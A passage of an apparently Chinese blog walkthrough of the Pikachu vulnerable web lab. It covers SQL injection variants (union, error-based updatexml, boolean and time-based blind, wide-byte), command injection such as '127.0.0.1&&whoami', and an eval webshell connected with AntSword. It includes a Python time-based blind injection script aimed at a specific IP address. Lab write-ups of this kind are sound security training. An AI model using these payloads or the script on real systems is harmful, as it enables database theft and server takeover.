查询语句中的字符串，从而导致后续的注入语句变成合法的 SQL 语句。</li><li>“UNION SELECT database(),2,3 #”：这是注入语句的一部分，使用 UNION SELECT 关键字进行注入。在这里，database() 是 MySQL 数据库的一个内置函数，用于获取当前数据库的名称，2 和 3 是两个固定的数字，表示一个具有三列的结果集。</li><li>“#”：这是一个 SQL 注释符号，用于注释掉查询语句的剩余部分，从而避免引起错误。<br>综合来说，这段 SQL 查询语句的目的是通过 SQL 注入攻击来尝试获取当前数据库的名称，并构造一个带有三列的结果集，其中第一列是当前数据库的名称，第二和第三列是固定的数字 2 和 3。<br><img src="https://img-blog.csdnimg.cn/img_convert/650a475c31608a70b3a5f527bacb60f3.png"><br>注入 payload: <code>g%&#39; union select database(),version(),current_user() #</code><img src="/images/Pasted%20image%2020230410193922.png"><br>注入<code>&#39; or 1=1 #</code><br><img src="/images/Pasted%20image%2020230410193151.png"><br>xx 型注入<br><img src="https://img-blog.csdnimg.cn/img_convert/aa538ffb180bfef70c62e13f518897cf.png"></li></ol><p>加入单引号后出现了报错，并且根据报错信息我们推断此处代码闭合方式为 %username%</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3e2038d70e3908c7f44047bfbccb7bda.png"></p><p>所以此处我们需要在单引号前加入 % 来闭合 (此处闭不闭合 % 其实都能注入成功)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; 页面报错</span><br><span class="line">123%&#x27;&#x27; 页面不报错</span><br><span class="line">123%&#x27; order by 4 --+ 页面提示没有4列，所以此处查询的sql有3列</span><br><span class="line">123%&#x27; union select 1,2,3 --+ 判断显示位，此处3列都能显示</span><br><span class="line">123%&#x27; union select database(),version(),user() --+ 获取当前数据库名称、版本信息、用户信息</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9d427b1c6984a0b98398161ebbe0b8d6.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/823fb4776e1a7b774016206f4e2e3aa4.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/118d9b15ca2f9dffa4c2b1ae9f01ab13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; 提示mysql报错信息</span><br><span class="line">123&#x27; order by 1 --+ 还是报错，根据报错信息判断123后面应该有个右括号需要闭合一下</span><br><span class="line">123&#x27;) order by 3 --+ 执行成功，判断查询的内容有2列</span><br><span class="line">123&#x27;) union select database(),version() --+ 使用union联合查询获取数据库名称和版本信息</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f8246e5328b15c9d2a2aee6d26b29acc.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/3baf80cdc45bf532b030b36aa1cce729.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/de1839e0ef01c25498960255b88bbe0d.png"></p><h3 id="insert-x2F-update-注入"><a href="#insert-x2F-update-注入" class="headerlink" title="insert&#x2F;update 注入"></a>insert&#x2F;update 注入</h3><blockquote><p>注意：<strong>此类型注入在实际测试中尽量不要使用，操作不当可能会导致数据库插入大量脏数据！！！</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/3f02955796ff59f7c93ebb4a5b731bb1.png"></p><p>首先在注册功能点输入任意内容，并在最后一个参数后面加入单引号，发现出现了 sql 语句报错，注意 这种 insert&#x2F;update 类型的 sql 在进行注入时尽量在最后一个参数插入 payload 进行注入，这样可以更容易闭合 sql 语句完成注入，像本关的这个 insert 语句我们直接就在<code>住址(Add)</code>这个参数进行注入，闭合前面的 sql 只需要加入<code>&#39;$payload)</code>(前后分别加入单引号和右括号)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本关的SQL语句：</span><br><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/df127fc8640c34602b817b29decbeb94.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8a28735ab7ffb7cb73b622ba2816a8de.png"></p><p>接下来获取数据库信息，使用以下 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1))+--+</span><br></pre></td></tr></table></figure><p><code>+</code> 用于 URL 编码空格，<code>--</code> 表示注释掉后续的 SQL 查询。<br><img src="/images/Pasted%20image%2020230411121516.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/3caf088a81dd7a58eb8ff6f673b4a31b.png"></p><p>获取数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+updatexml(1,concat(0x7e,(select+version()),0x7e),1))+--+</span><br></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020230411141503.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/1c100f4edcaeaf9e4e65822017059f56.png"></p><p>然后尝试使用刚注册的 123 账号进行登录，可以登录成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e3a0886a16389775862cf10001081702.png"></p><h3 id="delete-注入"><a href="#delete-注入" class="headerlink" title="delete 注入"></a>delete 注入</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3436af9562490fb36ad176cdaa717dc4.png"></p><p>添加任意语句并点击删除按钮，使用 burp 进行抓包</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b47c9111c35c4a2b71ecf2c1913ac828.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/781f44bc8e04103f56242c8b92093d01.png"></p><p>将该请求发送至 repeater 模块中进行测试，给参数 id 添加单引号，发现响应包会出现 sql 报错</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4ea23b798d6b6bafd2748ad0176a176d.png"></p><p>本关的 sql 语句，由于 id 为数字所以在注入时无需使用单引号进行闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(array_key_exists(**&#x27;id&#x27;**, $_GET))&#123;</span><br><span class="line">  $query = &quot;delete from message where id = &#123;$$_GET[&#x27;id&#x27;]&#125;&quot;;</span><br><span class="line">  ...&#125;</span><br></pre></td></tr></table></figure><p>本关还是使用报错注入的 payload，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">59+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/3766734ba147702f1752f22338829c9b.png"></p><h3 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/eb098a2ae1906bc7d9f947414d3c6630.png"></p><p>输入账号密码<code>admin</code> <code>123456</code>点击登录</p><p>登录后可以看到 header 的 ua 和 accept 等信息被展示出来了，此处我们可以尝试去注入</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a9c04b021a3b08a8840caeb580c282c6.png"></p><p>本关的 sql 语句如下：直接获取前端过来的头信息, 没有任何处理就存储到数据库中了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/393d398285aeecb0ca5b6d16f8dbad7a.png"></p><p>接下来我们尝试进行注入，在 user agent 内容后加入单引号发现报错，路径如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vul/sqli/sqli_header/sqli_header.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0ece8bfcd8b9a30a15dbe949fcbc9a4f.png"></p><p>使用以下 payload 获取数据库信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)+--+&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d8c81582837de3a8806cb7953695bc31.png"></p><h3 id="盲注-base-on-boolian"><a href="#盲注-base-on-boolian" class="headerlink" title="盲注 (base on boolian)"></a>盲注 (base on boolian)</h3><blockquote><p>布尔盲注就是猜测，根据页面返回的 true 和 flase 猜数据库总数，猜数据库长度，猜数据库名字，猜数据库长度，猜数据库内容，然后就是猜表和字段。盲注最快的方法就是用工具跑。</p></blockquote><p>burp暴力跑a-z，4位数跑出4个。<img src="/images/Pasted%20image%2020230411192455.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0fbdcba57c306e97be15e2fc95a20e1a.png"></p><p>输入<code>123</code>可以查到该用户存在并返回 uid 和 email，输入<code>1</code>则提示用不存在，判断此处可能存在布尔盲注</p><p><img src="https://img-blog.csdnimg.cn/img_convert/835dab4bd65f83a6a8b56577521cc41e.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6ecafa6d5e8b23c3f0b88364143b1c20.png"></p><p>使用以下 payload 进行注入，使用以下 sql payload 根据页面返回的信息 (用户存在 &#x2F; 不存在，即 true&#x2F;false) 来判断数据库名的长度，注意此处的<code>123</code>用户为真实存在的，如果使用不存在的用户使用此 payload 无法获得正确的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;and length(database())=7%23</span><br><span class="line"></span><br><span class="line">URL解码后：</span><br><span class="line">&#x27;and length(database())=7#</span><br><span class="line"># 注意最后的#必须使用URL编码</span><br></pre></td></tr></table></figure><p>当长度等于 6 时，页面提示 username 不存在</p><p><img src="https://img-blog.csdnimg.cn/img_convert/055278fd9383caf34873ee2119a41744.png"></p><p>当长度等于 7 时，页面显示了用户的 uid 和 email，所以判断数据库名的长度为 7</p><p><img src="https://img-blog.csdnimg.cn/img_convert/561eed0b59a2f51cd3c46bfba99975c7.png"></p><p>接下来使用 burp 爆破完整数据库名称，使用以下 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and substr(database(),1,1)=&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p>插入<br><img src="/images/Pasted%20image%2020230412110911.png"></p><p><img src="/images/Pasted%20image%2020230411193242.png"><br>这是一个包含参数的URL，其中包含了一个潜在的SQL注入漏洞。让我为您解释一下：</p><ul><li><p><code>http://121.36.98.179:8083/vul/sqli/sqli_blind_b.php</code>：这是一个URL，指向一个名为<code>sqli_blind_b.php</code>的PHP脚本，位于IP地址为<code>121.36.98.179</code>，端口号为<code>8083</code>的Web服务器上。</p></li><li><p><code>?name=jack&#39; and substr(database(),1,1)=&#39;a&#39; --+</code>：这是URL中的查询参数部分，通过GET方法将参数<code>name</code>的值设置为<code>jack&#39; and substr(database(),1,1)=&#39;a&#39; --+</code>传递给<code>sqli_blind_b.php</code>脚本。在这里，<code>name</code>参数的值被设置为一个包含SQL注入代码的字符串。</p></li><li><p><code>jack&#39; and substr(database(),1,1)=&#39;a&#39;</code>：这是一个潜在的SQL注入攻击&#x3D;&#x3D;载荷&#x3D;&#x3D;，通过在<code>name</code>参数值中注入SQL代码来尝试从数据库中获取信息。具体来说，这个注入攻击载荷试图通过&#x3D;&#x3D;检查数据库中第一个字符是否为字母<code>a</code>来探测数据库的名称&#x3D;&#x3D;。<code>substr(database(),1,1)</code>表示从数据库名称的&#x3D;&#x3D;第一个字符开始截取一个字符&#x3D;&#x3D;。</p></li><li><p><code>--+</code>：这是一个SQL注释符号，用于注释掉SQL代码后面的部分，以防止在执行SQL查询时出现语法错误。</p></li></ul><p>总的来说，这个URL中的参数<code>name</code>的值包含了一个潜在的SQL注入攻击载荷，试图通过检查数据库名称的第一个字符是否为字母<code>a</code>来利用<code>sqli_blind_b.php</code>脚本中的SQL注入漏洞。<br><img src="/images/Pasted%20image%2020230412111631.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d5f31d1bd6e2d67383185886d7ac6029.png"></p><p>设置长度 1-10</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5e84aa2ce38720522782a7e7ae0f35a3.png"></p><p>设置要爆破的字符<code>a-z</code>和<code>_</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/442a79f19fb35864858f3487082c53c7.png"></p><p>然后点击右上角的开始攻击，按照顺序拼写得到<code>pikachu</code></p><p><img src="/images/Pasted%20image%2020230412111938.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/299f83237cf2292f25545c93eaadb63e.png"></p><h3 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注 (base on time)"></a>盲注 (base on time)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/4609c9e50ce1e8aceb1da6140caf91bc.png"></p><p>本关的 sql 语句：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/538ee62761caacb5d9f5f41c6c933d06.png"></p><p>输入任意内容点击查询都会提示<code>i don&#39;t care who you are!</code>所以我们这里可以通过时间盲注进行测试，根据返回包的响应时间判断注入的 sql 语句有没有被执行，使用以下 payload 判断是否存在时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 当数据库名称的长度大于1时，则执行sleep(6)休眠6秒返回结果</span><br><span class="line">&#x27; and if(length(database())&gt;1,sleep(6),1) --+</span><br></pre></td></tr></table></figure><p>这个查询尝试通过判断数据库名的长度是否大于 1 来进行条件判断。如果数据库名长度大于 1，则会执行 <code>SLEEP(6)</code> 函数，导致查询延时 6 秒钟；否则，会执行 <code>1</code>，即没有延时。</p><p>通过观察延时的情况，攻击者可以根据查询的延时时间推断出数据库名的长度是否满足条件，从而逐位地获取数据库名的信息。这种方法在时间盲注攻击中常用于绕过一些安全措施，例如在错误消息中不返回具体的数据库信息，从而获取数据库结构和数据的敏感信息。<br><img src="/images/Pasted%20image%2020230412154638.png"></p><p>未插入 payload 时响应时间为 11 毫秒<br><img src="/images/Pasted%20image%2020230412153409.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8d799de220c9374b6295b1de33df0ce8.png"></p><p>插入 payload 且条件成立的情况下响应时间为 20 秒（延迟了输入时间的 1 倍），证明此处存在时间盲注</p><p><img src="https://img-blog.csdnimg.cn/img_convert/038f78a561243d2e7251c988b8955406.png"></p><p>接下来判断长度，当 length 大于 6 时执行了延迟（true），而当 length 大于 7 时直接返回了结果没有执行延迟（false），这就证明数据库名的长度等于 7</p><p><img src="https://img-blog.csdnimg.cn/img_convert/013e16d78bb0a207a5471233ae4a69f0.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/563a8791c56501e18ff32d08c914b825.png"></p><p>接下来进行爆破数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1)+--+</span><br></pre></td></tr></table></figure><p>本关的爆破方式与布尔盲注相同，将请求包发送至 Intruder 模块进行爆破即可，当执行结果为 true 时也会进行 sleep 延时</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b7fc63e1e191b3d754b428b94c47c7bb.png"></p><p><strong>推荐使用python直接脚本跑一下:</strong> burp检测时间不好用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> string  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 目标 URLurl = &#x27;http://121.36.98.179:8083/vul/sqli/sqli_blind_t.php?&#x27;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 构造参数  </span></span><br><span class="line">column = <span class="string">&#x27;database()&#x27;</span>  <span class="comment"># 要查询的列名  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 循环尝试不同的位置和值  </span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):  <span class="comment"># 1 到 7 的循环  </span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> string.ascii_lowercase:  <span class="comment"># 小写字母 a 到 z 的循环  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 构建 SQL 注入查询字符串  </span></span><br><span class="line">        sql_query = <span class="string">f&quot;name=lili&#x27; and if(substr(<span class="subst">&#123;column&#125;</span>,<span class="subst">&#123;index&#125;</span>,1)=&#x27;<span class="subst">&#123;value&#125;</span>&#x27;,sleep(3),1) --+&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 组合url  </span></span><br><span class="line">        url_1 = url + sql_query  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="comment"># 发送请求并记录开始时间  </span></span><br><span class="line">            start_time = time.perf_counter()  </span><br><span class="line">            response = requests.get(url_1)  </span><br><span class="line">            <span class="comment"># 计算请求响应时间  </span></span><br><span class="line">            elapsed_time = time.perf_counter() - start_time  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># 检查响应时间，这里根据具体情况来确定是否存在 SQL 注入漏洞  </span></span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;= <span class="number">3</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置：<span class="subst">&#123;index&#125;</span>，值：<span class="subst">&#123;value&#125;</span>，可能存在 SQL 注入漏洞&quot;</span>)  </span><br><span class="line">                <span class="comment"># 判断响应时间是否超过 3 秒，根据具体情况调整  </span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;注入成功&#x27;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置：<span class="subst">&#123;index&#125;</span>，值：<span class="subst">&#123;value&#125;</span>，未发现 SQL 注入漏洞&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请求发生异常:&#x27;</span>, e)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 简单检测  </span></span><br><span class="line"><span class="comment"># import requests  </span></span><br><span class="line"><span class="comment"># import time  </span></span><br><span class="line"><span class="comment"># import string  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># url = &#x27;http://121.36.98.179:8083/vul/sqli/sqli_blind_t.php?&#x27;  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># sql_query = f&quot;name=lili&#x27; and if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1) --+&amp;submit=%E6%9F%A5%E8%AF%A2&quot;  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># url_1=url+sql_query  </span></span><br><span class="line"><span class="comment"># print(requests.get(url=url_1).elapsed.total_seconds())</span></span><br></pre></td></tr></table></figure><h3 id="宽字节注入-wide-byte-注入"><a href="#宽字节注入-wide-byte-注入" class="headerlink" title="宽字节注入 (wide byte 注入)"></a>宽字节注入 (wide byte 注入)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/72105b3f66d51633f36fdbd49c8c156c.png"></p><p>宽字节注入是通过编码绕过后端代码的防御措施，列如正则过滤和转义函数转义。</p><p>客户端采用 GBK 编码格式，数据库对用户输入进行转义<code>\</code> ，转移符<code>\</code>的编码为 %5c，添加编码 %df, 组成 %df%5c，此时编码表达为繁体字連，从而绕过转义符让<code>&#39;</code>逃逸。</p><p>使用以下 payload 进行 sql 注入，判断存在宽字节注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>vinceB<span class="string">&#x27;union select 1,2#</span></span><br></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020230412193500.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="operator">%</span>df<span class="string">&#x27;+or+1=1+--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/df78bc57ee83533ef874f8754ef35749.png"></p><p>接下来使用 order by 判断 sql 中查询的列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">order</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span><span class="number">2</span><span class="operator">+</span><span class="comment">--+ 页面未报错</span></span><br><span class="line">kobe<span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">order</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span><span class="number">3</span><span class="operator">+</span><span class="comment">--+ 页面报错，判断有2列</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/00919b406447985a44af6800253ec61e.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/acf74ba5aa23742b97aecd9c5905afc3.png"></p><p>接下来使用 union 联合查询获取数据库名和版本号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">2</span>dvince<span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">user</span><span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">2</span>cdatabase<span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020230412194930.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe%df%27+union+select+database(),version()+--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/e2cc8ae0e4514abe7081888c9788dd20.png"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE(remote command&#x2F;code execute) 概述</p><p>RCE 漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p><strong>远程系统命令执行</strong></p><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口</p><p>比如我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上</p><p>一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交 “意想不到” 的命令，从而让后台进行执行，从而控制整个后台服务器</p><p>现在很多的甲方企业都开始实施自动化运维, 大量的系统操作会通过 “自动化运维平台” 进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞, 不信的话现在就可以找你们运维部的系统测试一下, 会有意想不到的 “收获”- _-</p><p><strong>远程代码执行</strong></p><p>同样的道理, 因为需求设计, 后台有时候也会把用户的输入作为代码的一部分进行执行, 也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数, 还是使用了不安全的反序列化等等。</p><p>因此，如果需要给前端用户提供操作类的 API 接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f860c9801e28b0ce70bc8a810e9d0149.png"></p><p>本关代码：直接将变量拼接进来，没做处理</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2462c6e72a0d852576192796095613bb.png"></p><p>我们先输入 127.0.0.1 然后 ping 一下试试，可以正常返回 ping 命令的结果</p><p><img src="https://img-blog.csdnimg.cn/img_convert/eefe4998d82ad694b6b76d629cb72a91.png"></p><p>接下来进行漏洞利用，尝试拼接命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b70da39b4f84e1aff0d23aa161783182.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;dir</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/7f492559decbc725023e5c179efafc85.png"></p><h3 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/73d16e9f217558fa2e2142524364968e.png"></p><p>本关代码分析：这里直接用 eval 执行了 post 传递过来的 txt 的值</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fcf3d4a8bae774f5c5548e85a3473edf.png"></p><p>本关有多种利用方式，比如直接输入<code>phpinfo();</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/1b58a65ab88c35295f2f10751c29b3b9.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/afb34356e7d6daba2f3fb25165dd5b0b.png"></p><p>本关的代码其实就是个一句话木马了<code>eval($_POST[&#39;txt&#39;]</code>，我们甚至可以直接使用蚁剑进行连接：)，配置如下：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1c6ead8d3f1384715338af9974ccf714.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b42cdfa32651007d714d3a462985ac01.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/af4cdc67c9015157ece21d11d596e36d.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/f343d61cd466b0e5143778265c773f63.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e9680b1cd284d980ec3136bd91035f95.png"></p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>File Inclusion(文件包含漏洞) 概述</p><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。</p><p>根据不同的配置环境，文件包含漏洞分为如下两种情况：</p><p><strong>1. 本地文件包含漏洞：</strong> 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p><p><strong>2. 远程文件包含漏洞：</strong> 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p><p>因此，在 web 